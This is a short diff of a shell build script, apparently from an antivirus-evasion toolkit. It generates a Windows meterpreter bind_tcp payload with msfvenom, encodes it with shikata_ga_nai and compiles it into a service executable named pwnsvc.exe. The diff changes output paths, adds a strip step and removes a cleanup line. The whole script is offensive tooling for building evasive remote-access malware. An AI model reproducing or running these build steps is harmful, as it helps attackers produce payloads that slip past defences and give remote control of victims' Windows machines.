@@ -20,7 +20,7 @@ msfvenom -p windows/meterpreter/bind_tcp lport=$LPORT -e x86/shikata_ga_nai -i 2
 ./make_avetsvc -f sc.txt
 
 # compile to pwn.exe file
-$win32_compiler -o pwnsvc.exe avetsvc.c
+$win32_compiler -o output/pwnsvc.exe source/avetsvc.c
+strip output/pwnsvc.exe
 
 # cleanup
-echo "" > defs.h
